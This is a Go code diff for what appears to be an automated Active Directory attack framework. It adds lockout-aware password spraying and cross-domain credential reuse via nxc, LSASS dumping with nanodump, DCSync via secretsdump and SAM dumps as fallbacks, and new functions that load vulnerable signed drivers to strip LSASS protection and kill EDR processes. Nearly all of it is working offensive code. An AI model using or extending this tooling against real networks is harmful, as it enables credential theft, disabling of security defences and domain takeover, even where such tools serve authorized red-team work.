@@ -133,6 +133,8 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 		}
 	}
 
+	time.Sleep(1 * time.Second)
+
 	// Username=password spray for each enumerated user
 	slog.Debug("Trying username=password combinations...")
 	for _, u := range state.Users {
@@ -167,8 +169,11 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 		}
 	}
 
+	time.Sleep(1 * time.Second)
+
 	// Cross-domain password reuse: try known credentials against other domains
 	slog.Debug("Testing cross-domain password reuse...")
+	cdAccountFails := make(map[string]int)
 	for _, cred := range state.Creds {
 		if cred.Secret == "" || cred.Username == "" {
 			continue
@@ -181,11 +186,18 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 			if existing[key] {
 				continue
 			}
+			if cdAccountFails[key] >= failThreshold {
+				continue
+			}
 			cr := utils.RunCommand("nxc", "smb", host.IP,
 				"-d", host.Domain,
 				"-u", cred.Username,
 				"-p", cred.Secret)
-			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
+			if cr.ExitCode != 0 {
+				cdAccountFails[key]++
+				continue
+			}
+			if strings.Contains(cr.Stdout, "[+]") {
 				slog.Info("Cross-domain reuse: credential valid", "domain", host.Domain, "username", cred.Username, "host", host.IP)
 				newCred := core.Credential{
 					Type: core.CredPlaintext, Username: cred.Username,
@@ -200,6 +212,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 					Value: cred.Secret, Confidence: 0.9, Timestamp: time.Now(),
 				})
 			}
+			cdAccountFails[key]++
 		}
 	}
 
@@ -213,6 +226,8 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 
 func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
+
+	utils.Section("🔑", "Credential Acquisition", "dumping and extracting secrets")
 
 	selectTarget(state, targetHost)
 
@@ -238,6 +253,12 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 
 	if len(result.Creds) > 0 {
 		result.Success = true
+	}
+
+	if len(result.Creds) > 0 {
+		utils.StepOk(fmt.Sprintf("Spray: obtained %d credential(s)", len(result.Creds)))
+	} else {
+		utils.StepWarn("No credentials found via password spraying")
 	}
 
 	return result
@@ -281,6 +302,9 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 
 	slog.Debug("Target", "ip", host.IP, "hostname", host.Hostname)
 
+	utils.Section("🔑", "Credential Acquisition Pipeline", fmt.Sprintf("profile=%s target=%s", profileName, host.IP))
+	utils.Attempt("💾", host.IP, fmt.Sprintf("nanodump via %s", pipeline.Name))
+
 	slog.Debug("LSASS dump via nanodump...")
 
 	result := executeNanodumpPipeline(state, host, pipeline, exec)
@@ -288,12 +312,14 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 	// Fallback: nanodump failed; try impacket-secretsdump DCSync
 	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
 		slog.Debug("nanodump failed, trying DCSync via impacket-secretsdump...")
+		utils.StepInfo("nanodump failed — trying DCSync via impacket-secretsdump...")
 		dcHost := host
 		if dc := findDC(state, host.Domain); dc.IP != "" {
 			dcHost = dc
 		}
 		fallback := executeSecretsdumpPipeline(state, dcHost)
 		if fallback.Success {
+			utils.StepOk("DCSync succeeded via secretsdump")
 			return fallback
 		}
 	}
@@ -301,10 +327,13 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 	// Fallback: try SAM dump via nxc
 	if !result.Success {
 		slog.Debug("Trying SAM dump via nxc...")
+		utils.StepInfo("Trying SAM dump via nxc...")
 		samResult := executeSAMDump(state, host)
 		if samResult.Success {
+			utils.StepOk("SAM dump succeeded")
 			return samResult
 		}
+		utils.StepWarn("All credential acquisition methods exhausted")
 	}
 
 	return result
@@ -443,6 +472,20 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	ctx := context.Background()
 
 	if pipeline.RemoteExec && domain != "" && pass != "" {
+		target := tools.NetExecTarget{
+			Protocol: "smb", Host: host.IP,
+			Domain: domain, Username: user, Password: pass, Hash: hash,
+		}
+
+		switch pipeline.PayloadType {
+		case "pplshade":
+			slog.Debug("Deploying PPLShade BYOVD bypass...", "ip", host.IP)
+			runPPLShadeBypass(ctx, target)
+		case "phantomkiller":
+			slog.Debug("Deploying PhantomKiller BYOVD bypass...", "ip", host.IP)
+			runPhantomKillerBypass(ctx, target)
+		}
+
 		slog.Debug("Deploying nanodump.exe to host via SMB", "ip", host.IP)
 		remoteDir := `C:\Windows\Temp\`
 		deployR := exec.Execute(ctx, core.Action{
@@ -450,7 +493,7 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
 		})
 		if !deployR.Success {
-			slog.Warn("Failed to deploy nanodump.exe")
+			slog.Debug("Failed to deploy nanodump.exe (non-critical — SAM fallback available)")
 			result.Success = false
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
@@ -466,16 +509,12 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 		ncfg.Output = dumpRemote
 
 		cmd := fmt.Sprintf(`%s --write %s --fork`, ndPath, dumpRemote)
-		target := tools.NetExecTarget{
-			Protocol: "smb", Host: host.IP,
-			Domain: domain, Username: user, Password: pass, Hash: hash,
-		}
 		cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
 		if err != nil || !cr.Success {
 			exec.Execute(ctx, core.Action{
 				Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
 			})
-			slog.Warn("nanodump remote execution failed")
+			slog.Debug("nanodump remote execution failed — SAM/LSA fallback available")
 			result.Success = false
 			return result
 		}
@@ -551,6 +590,116 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	result.Creds = append(result.Creds, creds...)
 	result.RawOutput = r.Stdout
 	return result
+}
+
+// runPPLShadeBypass deploys PPLShade.exe + LECOMAx64.sys to the target,
+// loads the BYOVD driver, and strips PPL protection from LSASS.
+// This must be called before nanodump when PayloadType is "pplshade".
+func runPPLShadeBypass(ctx context.Context, target tools.NetExecTarget) {
+	utils.StepInfo("Deploying PPLShade.exe + LECOMAx64.sys...")
+
+	shadePath, _, sErr := tools.Deploy(ctx, target, "PPLShade.exe", "", "")
+	if sErr != nil || shadePath == "" {
+		utils.StepWarn("Deploy PPLShade.exe failed: " + sErr.Error())
+		return
+	}
+
+	driverPath, _, dErr := tools.Deploy(ctx, target, "LECOMAx64.sys", "", "")
+	if dErr != nil || driverPath == "" {
+		utils.StepWarn("Deploy LECOMAx64.sys failed: " + dErr.Error())
+		tools.CleanupRemote(ctx, target, shadePath)
+		return
+	}
+
+	// WinRM target for remote exec (reliable on DCs where atexec/wmiexec fail)
+	wnt := tools.NetExecTarget{
+		Protocol: "winrm", Host: target.Host,
+		Domain: target.Domain, Username: target.Username,
+		Password: target.Password, Hash: target.Hash,
+	}
+
+	loadCmd := fmt.Sprintf(`%s load %s`, shadePath, driverPath)
+	utils.StepInfo("Loading BYOVD driver...")
+	lr, lErr := tools.NetExec.Run(ctx, wnt, "-x", []string{loadCmd})
+	if lErr != nil || !lr.Success {
+		detail := ""
+		if lErr != nil {
+			detail = lErr.Error()
+		} else {
+			detail = fmt.Sprintf("exit %d: %s", lr.ExitCode, strings.TrimSpace(lr.Stderr))
+		}
+		utils.StepWarn("Driver load failed: " + detail)
+		tools.CleanupRemote(ctx, target, shadePath, driverPath)
+		return
+	}
+
+	pid := getLSASSPID(ctx, target)
+	if pid == "" {
+		utils.StepWarn("Failed to get LSASS PID")
+		tools.CleanupRemote(ctx, target, shadePath, driverPath)
+		return
+	}
+
+	unprotectCmd := fmt.Sprintf(`%s unprotect %s`, shadePath, pid)
+	ur, uErr := tools.NetExec.Run(ctx, wnt, "-x", []string{unprotectCmd})
+	if uErr != nil || !ur.Success {
+		detail := ""
+		if uErr != nil {
+			detail = uErr.Error()
+		} else {
+			detail = fmt.Sprintf("exit %d: %s", ur.ExitCode, strings.TrimSpace(ur.Stderr))
+		}
+		utils.StepWarn("LSASS unprotect failed: " + detail)
+		tools.CleanupRemote(ctx, target, shadePath, driverPath)
+		return
+	}
+
+	utils.StepOk("PPL bypass complete — LSASS PPL stripped")
+	tools.CleanupRemote(ctx, target, shadePath, driverPath)
+}
+
+// runPhantomKillerBypass deploys PhantomKiller.exe + PhantomKiller.sys to the
+// target, loads the signed driver, and kills EDR processes. Call before
+// nanodump when PayloadType is "phantomkiller".
+func runPhantomKillerBypass(ctx context.Context, target tools.NetExecTarget) {
+	utils.StepInfo("Deploying PhantomKiller.exe + PhantomKiller.sys...")
+
+	phantomPath, _, pErr := tools.Deploy(ctx, target, "PhantomKiller.exe", "", "")
+	if pErr != nil || phantomPath == "" {
+		utils.StepWarn("Deploy PhantomKiller.exe failed: " + pErr.Error())
+		return
+	}
+
+	driverPath, _, dErr := tools.Deploy(ctx, target, "PhantomKiller.sys", "", "")
+	if dErr != nil || driverPath == "" {
+		utils.StepWarn("Deploy PhantomKiller.sys failed: " + dErr.Error())
+		tools.CleanupRemote(ctx, target, phantomPath)
+		return
+	}
+
+	wnt := tools.NetExecTarget{
+		Protocol: "winrm", Host: target.Host,
+		Domain: target.Domain, Username: target.Username,
+		Password: target.Password, Hash: target.Hash,
+	}
+
+	loadCmd := fmt.Sprintf(`%s load %s`, phantomPath, driverPath)
+	utils.StepInfo("Loading PhantomKiller driver...")
+	lr, lErr := tools.NetExec.Run(ctx, wnt, "-x", []string{loadCmd})
+	if lErr != nil || !lr.Success {
+		detail := ""
+		if lErr != nil {
+			detail = lErr.Error()
+		} else {
+			detail = fmt.Sprintf("exit %d: %s", lr.ExitCode, strings.TrimSpace(lr.Stderr))
+		}
+		utils.StepWarn("PhantomKiller driver load failed: " + detail)
+		tools.CleanupRemote(ctx, target, phantomPath, driverPath)
+		return
+	}
+
+	utils.StepOk("PhantomKiller bypass complete")
+	tools.CleanupRemote(ctx, target, phantomPath, driverPath)
 }
 
 func parseNanodumpOutput(output string) []core.Credential {
